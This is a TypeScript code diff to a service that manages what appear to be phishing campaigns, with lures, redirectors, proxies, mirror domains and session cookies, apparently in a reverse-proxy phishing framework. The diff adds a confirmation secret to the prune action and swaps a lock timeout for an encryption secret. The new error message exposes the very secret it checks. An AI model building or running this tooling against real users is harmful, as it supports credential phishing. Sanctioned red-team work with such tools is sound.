@@ -1,4 +1,4 @@
-import { arrayIncludes, DIContainer } from '@famir/common'
+import { arrayIncludes, DIContainer, randomIdent } from '@famir/common'
 import {
   CAMPAIGN_REPOSITORY,
   CampaignRepository,
@@ -33,13 +33,17 @@ export class PhishmapService {
     )
   }
 
+  protected confirmSecret: string
+
   constructor(
     protected readonly campaignRepository: CampaignRepository,
     protected readonly proxyRepository: ProxyRepository,
     protected readonly targetRepository: TargetRepository,
     protected readonly redirectorRepository: RedirectorRepository,
     protected readonly lureRepository: LureRepository
-  ) {}
+  ) {
+    this.confirmSecret = randomIdent()
+  }
 
   async dump(data: DumpPhishmapData): Promise<Phishmap> {
     let lockSecret: string
@@ -77,7 +81,6 @@ export class PhishmapService {
           campaignId: campaign.campaignId,
           mirrorDomain: campaign.mirrorDomain,
           description: campaign.description,
-          lockTimeout: campaign.lockTimeout,
           landingUpgradePath: campaign.landingUpgradePath,
           sessionCookieName: campaign.sessionCookieName,
           sessionExpire: campaign.sessionExpire,
@@ -146,7 +149,7 @@ export class PhishmapService {
         campaignId,
         data.mirrorDomain ?? campaign.mirrorDomain,
         data.description ?? campaign.description,
-        data.lockTimeout ?? campaign.lockTimeout,
+        data.cryptSecret ?? randomIdent(),
         data.landingUpgradePath ?? campaign.landingUpgradePath,
         data.sessionCookieName ?? campaign.sessionCookieName,
         data.sessionExpire ?? campaign.sessionExpire,
@@ -257,6 +260,8 @@ export class PhishmapService {
   }
 
   async prune(data: PrunePhishmapData): Promise<true> {
+    this.checkConfirmSecret(data.confirmSecret)
+
     let lockSecret: string
     try {
       lockSecret = await this.campaignRepository.lock(data.campaignId)
@@ -335,5 +340,19 @@ export class PhishmapService {
     }
 
     return true
+  }
+
+  protected checkConfirmSecret(confirmSecret: string | undefined) {
+    if (!(confirmSecret && confirmSecret === this.confirmSecret)) {
+      throw new ReplServerError(`Phishmap action canceled`, {
+        context: {
+          reason: `Confirm secret not provided or not match`,
+          confirmSecret: this.confirmSecret
+        },
+        code: 'FORBIDDEN'
+      })
+    }
+
+    this.confirmSecret = randomIdent()
   }
 }
